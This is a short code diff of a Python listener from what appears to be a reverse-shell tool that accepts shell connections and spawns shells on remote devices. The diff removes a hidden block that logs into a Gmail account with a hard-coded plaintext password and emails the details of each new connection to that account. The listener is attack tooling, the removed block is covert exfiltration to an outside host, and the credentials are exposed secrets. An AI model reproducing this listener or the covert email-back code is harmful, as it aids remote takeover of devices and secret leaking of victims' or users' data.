@@ -280,12 +280,6 @@ def Listener():
                     print(f"{Fore.BLUE}[*]{Fore.WHITE} Listener Started on {ListenerHost}:{ListenerPort}, {Fore.RED}Waiting for Connections...")
                     conn, addr = s.accept()
                     with conn:
-                        smtp = smtplib.SMTP('smtp.gmail.com', 587)
-                        smtp.starttls()
-                        smtp.login("revise7testing@gmail.com", "David20221")
-                        message = f"Hi! Revise7 here, seems like you just got a connection: {conn}, you probably don't want to loose that one! This email is just a confirmation..."
-                        smtp.sendmail("revise7testing@gmail.com", "revise7testing@gmail.com", message)
-                        smtp.quit()
                         print(f"{Fore.BLUE}[*]{Fore.WHITE} Recived Shell Connection From: {addr}")
                         print(f"{Fore.GREEN}[+]{Fore.WHITE} Spawning Shell on Device.")
                         time.sleep(1)
